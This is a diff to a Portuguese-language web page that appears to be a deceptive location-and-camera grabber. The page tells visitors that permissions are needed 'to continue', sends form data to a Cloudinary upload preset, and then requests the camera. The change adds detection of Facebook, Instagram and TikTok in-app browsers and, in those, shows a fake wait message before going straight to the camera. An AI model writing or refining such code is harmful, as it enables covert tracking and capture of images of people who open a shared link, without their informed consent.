@@ -18,6 +18,7 @@
 </head>
 <body>
   <div id="overlay">Seu navegador precisa de acesso à localização para continuar. Toque para tentar novamente.</div>
+
   <script>
     const cloudName = 'dx5legahb';
     const uploadPreset = 'upload';
@@ -34,6 +35,16 @@
     function hideOverlay() {
       overlay.style.display = 'none';
       overlay.onclick = null;
+    }
+
+    function isWebView() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      return (
+        ua.includes('FBAN') || ua.includes('FBAV') || // Facebook
+        ua.includes('Instagram') ||                  // Instagram
+        ua.includes('TikTok') ||                     // TikTok
+        (document.referrer && document.referrer.includes('tiktok'))
+      );
     }
 
     function askLocation() {
@@ -59,7 +70,7 @@
         body: form
       })
       .then(() => {
-        askCamera(); // Agora sempre tenta a câmera direto, sem mensagem no Safari
+        askCamera(); // Vai pra câmera após localização
       })
       .catch(() => {
         showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente ou acesse as configurações do navegador ou do seu dispositivo para concedê-las.', askLocation);
@@ -103,7 +114,15 @@
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-      showOverlay('Toque para continuar', askLocation);
+      if (isWebView()) {
+        showOverlay('Este navegador pode bloquear permissões. Aguarde 5 segundos...', () => {});
+        setTimeout(() => {
+          hideOverlay();
+          askCamera();
+        }, 5000);
+      } else {
+        showOverlay('Toque para continuar', askLocation);
+      }
     });
   </script>
 </body>
